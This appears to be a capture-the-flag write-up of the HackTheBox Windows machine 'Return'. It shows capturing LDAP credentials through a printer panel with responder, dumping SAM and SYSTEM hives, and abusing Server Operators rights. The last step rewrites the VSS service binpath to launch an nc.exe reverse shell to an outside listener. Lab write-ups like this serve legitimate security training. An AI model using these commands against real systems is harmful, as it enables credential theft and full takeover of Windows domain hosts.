# Return

## Gaining Access

Nmap scan:

```
$ nmap -p- --min-rate 5000 10.129.95.241 
Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-05 02:24 EDT
Nmap scan report for 10.129.95.241
Host is up (0.0073s latency).
Not shown: 65512 closed tcp ports (conn-refused)
PORT      STATE SERVICE
53/tcp    open  domain
80/tcp    open  http
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
5985/tcp  open  wsman
9389/tcp  open  adws
47001/tcp open  winrm
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49667/tcp open  unknown
49671/tcp open  unknown
49674/tcp open  unknown
49675/tcp open  unknown
49678/tcp open  unknown
49681/tcp open  unknown
49698/tcp open  unknown
```

### SMB Enum

`enum4linux` returned nothong of interest with both null and guest credentials.&#x20;

### LDAP

`ldapsearch` returns nothing because we have no credentials.

### HTTP --> Printer Creds

There is a HTTP port open, and when viewed, it shows a Printer Admin Panel:

<figure><img src="../../../.gitbook/assets/image (3167).png" alt=""><figcaption></figcaption></figure>

When we view the settings, this is what we see:

<figure><img src="../../../.gitbook/assets/image (1257).png" alt=""><figcaption></figcaption></figure>

This looks poisanable since we can control the server address. As such, I started `responder`.&#x20;

```bash
$ sudo responder -I tun0
LDAP] Cleartext Client   : 10.129.95.241
[LDAP] Cleartext Username : return\svc-printer
[LDAP] Cleartext Password : 1edFg43012!!
```

We now have some credentials. We can use these to login with `evil-winrm`.&#x20;

<figure><img src="../../../.gitbook/assets/image (3470).png" alt=""><figcaption></figcaption></figure>

We can grab the user flag.

## Privilege Escalation

### SeBackupPrivilege Fail

When we check our privileges, we see that we have a lot:

```
*Evil-WinRM* PS C:\Users\svc-printer\Desktop> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                         State
============================= =================================== =======
SeMachineAccountPrivilege     Add workstations to domain          Enabled
SeLoadDriverPrivilege         Load and unload device drivers      Enabled
SeSystemtimePrivilege         Change the system time              Enabled
SeBackupPrivilege             Back up files and directories       Enabled
SeRestorePrivilege            Restore files and directories       Enabled
SeShutdownPrivilege           Shut down the system                Enabled
SeChangeNotifyPrivilege       Bypass traverse checking            Enabled
SeRemoteShutdownPrivilege     Force shutdown from a remote system Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set      Enabled
SeTimeZonePrivilege           Change the time zone                Enabled
```

With this, we can save the `system` and `sam` files, then dump the hashes with `secretsdump.py`.&#x20;

```
reg save hklm\sam c:\users\svc-printer\sam
reg save hklm\system c:\users\svc-printer\system
download sam
download system
```

Afterwards, we can dump hashes:

<figure><img src="../../../.gitbook/assets/image (1678).png" alt=""><figcaption></figcaption></figure>

However, when trying to pass the hash, it seems that this doesn't work.

### Services Exploit

When we check which groups we are part of in the machine, we see that `svc-printer` is part of Server Operators.

```
*Evil-WinRM* PS C:\Users\svc-printer\Documents> net user svc-printer
User name                    svc-printer
Full Name                    SVCPrinter
Comment                      Service Account for Printer
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            5/26/2021 1:15:13 AM
Password expires             Never
Password changeable          5/27/2021 1:15:13 AM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   5/26/2021 1:39:29 AM

Logon hours allowed          All

Local Group Memberships      *Print Operators      *Remote Management Use
                             *Server Operators
Global Group memberships     *Domain Users
The command completed successfully.
```

We can also check the services running with `services`.

```
*Evil-WinRM* PS C:\Users\svc-printer\Documents> services

Path                                                                                                                 Privileges Service          
----                                                                                                                 ---------- -------          
C:\Windows\ADWS\Microsoft.ActiveDirectory.WebServices.exe                                                                  True ADWS             
\??\C:\ProgramData\Microsoft\Windows Defender\Definition Updates\{5533AFC7-64B3-4F6E-B453-E35320B35716}\MpKslDrv.sys       True MpKslceeb2796    
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\SMSvcHost.exe                                                              True NetTcpPortSharing
C:\Windows\SysWow64\perfhost.exe                                                                                           True PerfHost         
"C:\Program Files\Windows Defender Advanced Threat Protection\MsSense.exe"                                                False Sense            
C:\Windows\servicing\TrustedInstaller.exe                                                                                 False TrustedInstaller 
"C:\Program Files\VMware\VMware Tools\VMware VGAuth\VGAuthService.exe"                                                     True VGAuthService    
"C:\Program Files\VMware\VMware Tools\vmtoolsd.exe"                                                                        True VMTools          
"C:\ProgramData\Microsoft\Windows Defender\platform\4.18.2104.14-0\NisSrv.exe"                                             True WdNisSvc         
"C:\ProgramData\Microsoft\Windows Defender\platform\4.18.2104.14-0\MsMpEng.exe"                                            True WinDefend        
"C:\Program Files\Windows Media Player\wmpnetwk.exe"                                                                      False WMPNetworkSvc 
```

Since we have privileges over some of the services, we can follow this article online to execute a reverse shell via `nc.exe` as `SYSTEM`.

{% embed url="https://www.hackingarticles.in/windows-privilege-escalation-server-operator-group/" %}

However, it seems that although we have privileges over these services, we cannot restart them for some reason. So we need to find a service that is currently stopped, then change its configuration and start it.&#x20;

Again, we fail in this aspect because we don't have access to the Service Control Manager to view what we can control. So in this case, I used a writeup and saw that they used the VSS service to do the exploit.&#x20;

```
*Evil-WinRM* PS C:\Users\svc-printer\Documents> sc.exe query VSS

SERVICE_NAME: VSS
        TYPE               : 10  WIN32_OWN_PROCESS
        STATE              : 1  STOPPED
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0
```

I wasn't too sure how they got to using this. Anyways, we can configure it like so:

```
*Evil-WinRM* PS C:\Users\svc-printer\Documents> sc.exe config VSS binpath="C:\Windows\system32\cmd.exe /c C:\users\svc-printer\documents\nc.exe -e cmd.exe 10.10.14.13 4444"
[SC] ChangeServiceConfig SUCCESS
*Evil-WinRM* PS C:\Users\svc-printer\Documents> sc.exe start VSS
```

This would create a reverse shell on our listener port:

<figure><img src="../../../.gitbook/assets/image (2367).png" alt=""><figcaption></figcaption></figure>
